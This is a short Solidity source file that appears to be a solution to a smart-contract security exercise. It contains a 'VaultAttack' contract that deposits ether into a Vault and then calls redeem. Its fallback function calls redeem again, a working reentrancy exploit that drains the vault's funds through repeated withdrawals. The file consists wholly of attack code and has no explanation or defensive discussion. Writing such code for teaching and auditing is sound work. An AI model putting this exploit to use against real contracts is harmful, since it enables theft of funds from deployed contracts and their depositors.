pragma solidity 0.4.15;

import './Exo9.sol';

contract VaultAttack {
  event LogString(string str);
  Vault vault;

  function VaultAttack(Vault addr) payable {
      vault = addr;
  }

  function storeAttack() payable {
    vault.store.value(10 ether)();
    // or   vault.call.value(10 ether)(bytes4(sha3("store()")));
    vault.redeem();
  }

  function() payable {
    LogString('Fallback Start');
    vault.redeem();
    LogString('Fallback End');
  }
}